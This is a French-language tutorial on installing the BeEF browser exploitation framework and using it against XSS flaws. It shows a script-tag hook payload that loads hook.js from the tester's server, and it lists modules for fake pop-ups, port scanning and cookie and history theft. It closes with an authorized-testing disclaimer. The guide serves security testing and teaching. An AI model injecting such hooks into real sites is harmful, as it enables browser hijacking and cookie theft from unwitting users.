# BeEF et Hacking XSS

# 1- Introduction

BeEF, ou Browser Exploitation Framework, est un outil puissant utilisé pour tester la sécurité des navigateurs web en exploitant les vulnérabilités XSS (Cross-Site Scripting). Ce guide vous aidera à comprendre comment utiliser BeEF pour exploiter les vulnérabilités XSS et tester la sécurité de vos applications web.

# 2 - Prérequis

- Une machine avec une distribution Linux (ex. : Ubuntu)
- Ruby installé
- Git installé

# 3 - Installation de BeEF

1. Clonez le dépôt BeEF depuis GitHub :

   ```sh
   git clone https://github.com/beefproject/beef.git
   ```

2. Accédez au répertoire BeEF :

   ```sh
   cd beef
   ```

3. Installez les dépendances :

   ```sh
   ./install
   ```

4. Démarrez BeEF :

   ```sh
   ./beef
   ```

# 4 - Configuration de BeEF

1. Ouvrez le fichier de configuration BeEF (`config.yaml`) dans un éditeur de texte :

   ```sh
   nano config.yaml
   ```

2. Configurez les paramètres suivants :
   
   - `beef.credentials.user: "votre_utilisateur"`
   - `beef.credentials.passwd: "votre_mot_de_passe"`

3. Sauvegardez et fermez le fichier.

# 5 - Utilisation de BeEF

### Accès à l'Interface Web de BeEF

1. Ouvrez votre navigateur et accédez à `http://localhost:3000/ui/panel`.

2. Connectez-vous avec les identifiants configurés dans `config.yaml`.

### Exploitation XSS avec BeEF

#### Injection d'un Hook JavaScript

Pour exploiter une vulnérabilité XSS, vous devez injecter un hook JavaScript dans la page cible. Voici un exemple de code de hook :

```html
<script src="http://[IP_de_votre_serveur]:3000/hook.js"></script>
```

Remplacez `[IP_de_votre_serveur]` par l'adresse IP de votre machine exécutant BeEF.

#### Simulation d'une Attaque XSS

1. Identifiez une vulnérabilité XSS dans l'application web cible.

2. Injectez le code de hook JavaScript dans le champ vulnérable.

3. Une fois le hook exécuté, l'interface BeEF affichera la cible comme un "Zombie Browser".

### Modules d'Exploitation

BeEF fournit plusieurs modules d'exploitation que vous pouvez utiliser une fois que le navigateur de la victime est hooké. Voici quelques exemples :

- **Social Engineering** : Affichage de faux pop-ups, redirections, etc.
- **Network** : Scan de ports, collecte d'informations réseau.
- **Browser** : Récupération d'historique de navigation, capture de cookies.

Pour utiliser un module :

1. Sélectionnez le "Zombie Browser" dans l'interface BeEF.
2. Allez dans l'onglet "Commands".
3. Choisissez un module et cliquez sur "Execute".

# 6 - Conclusion

BeEF est un outil puissant pour tester la sécurité des navigateurs et des applications web contre les attaques XSS. En comprenant comment injecter des hooks JavaScript et utiliser les modules d'exploitation de BeEF, vous pouvez identifier et corriger les vulnérabilités avant qu'elles ne soient exploitées par des attaquants malveillants.

## Avertissement

L'utilisation de BeEF pour attaquer des systèmes sans autorisation est illégale et contraire à l'éthique. Ce guide est destiné à des fins éducatives et de test de sécurité autorisés uniquement. Utilisez BeEF de manière responsable.

## Ressources

- [BeEF Project GitHub](https://github.com/beefproject/beef)
- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
